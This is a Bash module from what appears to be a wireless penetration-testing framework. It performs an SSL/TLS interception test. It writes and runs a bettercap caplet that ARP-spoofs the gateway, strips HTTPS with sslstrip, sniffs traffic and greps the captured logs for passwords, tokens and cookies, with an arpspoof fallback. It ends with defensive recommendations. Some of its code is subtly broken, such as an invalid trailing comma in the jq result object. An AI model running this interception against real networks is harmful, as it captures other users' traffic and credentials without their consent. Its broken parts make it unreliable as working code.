#!/usr/bin/env bash
#===============================================================================
#  modules/g2_ssl_interception.sh
#  G2: SSL/TLS Interception & MITM Test
#
#  PURPOSE:
#    Test if SSL/TLS traffic on the target network can be intercepted via
#    ARP spoofing + SSL stripping. Checks for HSTS enforcement, certificate
#    pinning, and cleartext credential exposure.
#
#  TOOLS: ${TOOL_PATHS[bettercap]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[arpspoof]} (dsniff)
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: B1 (needs network info, client visibility)
#
#  EVIDENCE PRODUCED:
#    - g2_mitm_capture.pcap          (intercepted traffic capture)
#    - g2_stripped_urls.txt           (URLs where SSL was stripped)
#    - g2_captured_creds.txt         (any cleartext credentials)
#    - g2_findings.txt               (analysis summary)
#
#  RESULT JSON FIELDS:
#    - arp_spoof_successful: bool
#    - ssl_strip_effective: bool
#    - hsts_enforced: bool
#    - credentials_captured: int
#    - cleartext_urls: int
#===============================================================================

run_g2() {
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/g2"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    
    local has_bettercap=false
    local has_arpspoof=false
    local has_tcpdump=false

    command -v bettercap &>/dev/null && has_bettercap=true
    command -v arpspoof &>/dev/null && has_arpspoof=true
    command -v tcpdump &>/dev/null && has_tcpdump=true

    if [[ "$has_bettercap" == "false" && "$has_arpspoof" == "false" ]]; then
        log_error "Either ${TOOL_PATHS[bettercap]} or ${TOOL_PATHS[arpspoof]} (dsniff) is required."
        log_error "Install: apt install -y ${TOOL_PATHS[bettercap]} dsniff"
        return 1
    fi

    if [[ "$has_tcpdump" == "false" ]]; then
        log_error "${TOOL_PATHS[tcpdump]} is required for traffic capture."
        return 1
    fi

    ensure_managed_mode || return 1

    if [[ -z "${GATEWAY_IP:-}" ]]; then
        log_error "Gateway IP not set. Ensure you are connected to the target network."
        return 1
    fi

    local iface="${WIFI_INTERFACE:-wlan0}"
    log_success "Interface: ${iface}, Gateway: ${GATEWAY_IP}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ SSL/TLS INTERCEPTION & MITM TEST ★                           ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will:                                                   ║"
    echo "  ║    • ARP spoof the gateway to intercept traffic                   ║"
    echo "  ║    • Attempt SSL stripping on HTTPS connections                   ║"
    echo "  ║    • Check for HSTS enforcement and cert pinning                  ║"
    echo "  ║    • Capture any cleartext credentials in transit                 ║"
    echo "  ║                                                                    ║"
    echo "  ║  ⚠  This WILL intercept other users' traffic temporarily.        ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "g2_confirm" "Proceed with SSL/TLS interception test? [Y/n]" "Y"
    [[ "${g2_confirm,,}" == "n" ]] && return 1

    local arp_spoof_successful="false"
    local ssl_strip_effective="false"
    local hsts_enforced="true"
    local credentials_captured=0
    local cleartext_urls=0
    local findings_file="${evidence_prefix}_findings.txt"
    local stripped_urls_file="${evidence_prefix}_stripped_urls.txt"
    local creds_file="${evidence_prefix}_captured_creds.txt"
    local mitm_pcap="${evidence_prefix}_mitm_capture.pcap"

    {
        echo "============================================================"
        echo "  G2: SSL/TLS Interception & MITM Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Interface: ${iface}, Gateway: ${GATEWAY_IP}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    : > "$stripped_urls_file"
    : > "$creds_file"

    #--- Step 2: Enable IP forwarding ---
    log_step 2 $total_steps "Configuring IP forwarding"
    update_tc_progress 2 $total_steps "IP forwarding"

    local orig_forwarding
    local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
    echo 1 > /proc/sys/net/ipv4/ip_forward
    register_cleanup "echo ${orig_forwarding} > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true"

    check_abort || return 1

    #--- Step 3: Start traffic capture ---
    log_step 3 $total_steps "Starting traffic capture"
    update_tc_progress 3 $total_steps "Traffic capture"

    ${TOOL_PATHS[tcpdump]} -i "$iface" -w "$mitm_pcap" -c 50000 \
        "tcp port 80 or tcp port 443 or tcp port 8080" \
        &>/dev/null &
    local tcpdump_pid=$!
    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"

    #--- Step 4: ARP spoofing + MITM ---
    log_step 4 $total_steps "Performing ARP spoofing and MITM attack"
    update_tc_progress 4 $total_steps "MITM attack"

    check_abort || return 1

    if [[ "$has_bettercap" == "true" ]]; then
        # Use ${TOOL_PATHS[bettercap]} for ARP spoof + SSL strip + credential capture
        local bettercap_log="${evidence_prefix}_bettercap.log"
        local bettercap_cap="/tmp/g2_bettercap.cap"

        # Create ${TOOL_PATHS[bettercap]} caplet
        local caplet="/tmp/tc27.cap"
        cat > "$caplet" <<'CAPLET'
set arp.spoof.fullduplex true
set arp.spoof.internal false
set net.sniff.verbose true
set net.sniff.output /tmp/g2_bettercap_sniff.pcap
arp.spoof on
net.sniff on
set http.proxy.sslstrip true
set http.proxy.sslstrip.log /tmp/g2_sslstrip.log
http.proxy on
set events.stream.output /tmp/g2_events.log
sleep 120
arp.spoof off
net.sniff off
http.proxy off
quit
CAPLET

        log_cmd "${TOOL_PATHS[bettercap]} -iface ${iface} -caplet ${caplet}"

        timeout 150 ${TOOL_PATHS[bettercap]} \
            -iface "$iface" \
            -caplet "$caplet" \
            -silent > "$bettercap_log" 2>&1 || true

        local arp_spoof_successful="true"

        # Parse results
        if [[ -f /tmp/g2_sslstrip.log ]]; then
            local cleartext_urls=$(wc -l < /tmp/g2_sslstrip.log 2>/dev/null) || true
            local cleartext_urls=${cleartext_urls:-0}
            if [[ $cleartext_urls -gt 0 ]]; then
                local ssl_strip_effective="true"
                local hsts_enforced="false"
                cp /tmp/g2_sslstrip.log "$stripped_urls_file"
                log_result "FINDING" "SSL strip effective — ${cleartext_urls} URL(s) stripped"
                echo "FINDING: SSL strip effective (${cleartext_urls} URLs)" >> "$findings_file"
            else
                log_info "SSL strip not effective — HSTS may be enforced"
                echo "INFO: SSL strip not effective, HSTS likely enforced" >> "$findings_file"
            fi
        fi

        # Check for captured credentials
        if [[ -f /tmp/g2_events.log ]]; then
            local cred_lines
            local cred_lines=$(grep -iE 'password|passwd|login|user|credential|token' \
                /tmp/g2_events.log 2>/dev/null | grep -v "^#" || true)
            if [[ -n "$cred_lines" ]]; then
                local credentials_captured=$(echo "$cred_lines" | wc -l)
                echo "$cred_lines" >> "$creds_file"
                log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured in transit!"
                echo "CRITICAL: Credentials captured in cleartext" >> "$findings_file"
            fi
        fi

        rm -f "$caplet" /tmp/g2_sslstrip.log /tmp/g2_events.log /tmp/g2_bettercap_sniff.pcap

    elif [[ "$has_arpspoof" == "true" ]]; then
        # Fallback: use ${TOOL_PATHS[arpspoof]} from dsniff
        local arp_spoof_successful="true"

        start_countdown 90 "ARP spoofing — intercepting traffic"
        run_attack_tool --timeout 90 --cmd "${TOOL_PATHS[arpspoof]} -i $iface -t $GATEWAY_IP -r"
        stop_countdown

        log_info "ARP spoof completed (basic mode — no SSL strip without ${TOOL_PATHS[bettercap]})"
        echo "INFO: ARP spoof performed but SSL strip requires ${TOOL_PATHS[bettercap]}" >> "$findings_file"
    fi

    #--- Step 5: Post-MITM analysis ---
    log_step 5 $total_steps "Analyzing captured traffic"
    update_tc_progress 5 $total_steps "Analysis"

    # Stop capture for analysis
    kill -SIGINT $tcpdump_pid 2>/dev/null || true
    wait $tcpdump_pid 2>/dev/null || true
    validate_pcap "$mitm_pcap" "MITM traffic capture"

    # Analyze for cleartext HTTP in capture
    if command -v tshark &>/dev/null && [[ -f "$mitm_pcap" ]]; then
        local http_posts
        http_posts=$(${TOOL_PATHS[tshark]} -r "$mitm_pcap" -Y "http.request.method == POST" \
            2>/dev/null | wc -l) || true
        http_posts=${http_posts:-0}

        if [[ $http_posts -gt 0 ]]; then
            log_info "Captured ${http_posts} HTTP POST request(s) in cleartext"
            echo "INFO: ${http_posts} cleartext HTTP POST requests captured" >> "$findings_file"
        fi

        local http_auth
        http_auth=$(${TOOL_PATHS[tshark]} -r "$mitm_pcap" \
            -Y "http.authorization or http.cookie" \
            2>/dev/null | wc -l) || true
        http_auth=${http_auth:-0}

        if [[ $http_auth -gt 0 ]]; then
            log_result "FINDING" "Captured ${http_auth} HTTP auth/cookie header(s)"
            echo "FINDING: ${http_auth} auth/cookie headers captured" >> "$findings_file"
        fi
    fi

    #--- Step 6: Restore networking ---
    log_step 6 $total_steps "Restoring network configuration"
    update_tc_progress 6 $total_steps "Restore"

    # Send gratuitous ARP to flush poisoned caches
    if command -v arping &>/dev/null; then
        ${TOOL_PATHS[arping]} -c 3 -A -I "$iface" "$GATEWAY_IP" &>/dev/null || true
    fi

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$ssl_strip_effective" == "true" || $credentials_captured -gt 0 ]]; then
        result_status="FINDING"
        result_summary="SSL/TLS interception was successful. "
        [[ "$ssl_strip_effective" == "true" ]] && result_summary+="SSL stripping effective on ${cleartext_urls} URL(s) — HSTS not enforced. "
        [[ $credentials_captured -gt 0 ]] && result_summary+="${credentials_captured} credential(s) captured in cleartext."
        recommendations="1) Enforce HSTS on all web services accessible from target WiFi. "
        recommendations+="2) Enable Dynamic ARP Inspection (DAI) on the switch/VLAN. "
        recommendations+="3) Enable DHCP Snooping to prevent ARP spoofing. "
        recommendations+="4) Deploy 802.1X port-based access control. "
        recommendations+="5) Use certificate pinning on critical internal applications."
    elif [[ "$arp_spoof_successful" == "true" ]]; then
        result_status="FINDING"
        result_summary="ARP spoofing was successful but SSL stripping was not effective (HSTS likely enforced). Traffic interception is possible but HTTPS protections held."
        recommendations="1) Enable Dynamic ARP Inspection (DAI) to prevent ARP spoofing. "
        recommendations+="2) HSTS is working — ensure all services enforce it. "
        recommendations+="3) Enable DHCP Snooping."
    else
        result_summary="SSL/TLS interception test could not be completed or ARP spoofing was blocked."
        recommendations="Verify that DAI or similar protections are in place."
    fi

    local result_json
    evidence_register_file "g2_mitm_capture.pcap"
    evidence_register_file "g2_stripped_urls.txt"
    evidence_register_file "g2_captured_creds.txt"
    evidence_register_file "g2_findings.txt"

    result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "ARP spoof: ${arp_spoof_successful}, SSL strip: ${ssl_strip_effective}, HSTS: ${hsts_enforced}, Creds: ${credentials_captured}, Stripped URLs: ${cleartext_urls}" \
        --arg recommendations "$recommendations" \
        --arg arp_spoof_successful "$arp_spoof_successful" \
        --arg ssl_strip_effective "$ssl_strip_effective" \
        --arg hsts_enforced "$hsts_enforced" \
        --argjson credentials_captured "$credentials_captured" \
        --argjson cleartext_urls "${cleartext_urls:-0}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            arp_spoof_successful: ($arp_spoof_successful == "true"),
            ssl_strip_effective: ($ssl_strip_effective == "true"),
            hsts_enforced: ($hsts_enforced == "true"),
            credentials_captured: $credentials_captured,
            cleartext_urls: $cleartext_urls,
                    }')

    save_tc_result "G2" "$result_json"

    echo ""
    if [[ "$ssl_strip_effective" == "true" ]]; then
        log_result "FINDING" "SSL strip effective — HSTS NOT enforced (${cleartext_urls} URLs stripped)"
    elif [[ "$arp_spoof_successful" == "true" ]]; then
        log_result "FINDING" "ARP spoof successful but HSTS held — limited MITM impact"
    else
        log_result "SECURE" "MITM test: ARP spoofing was blocked or ineffective"
    fi

    return 0
}
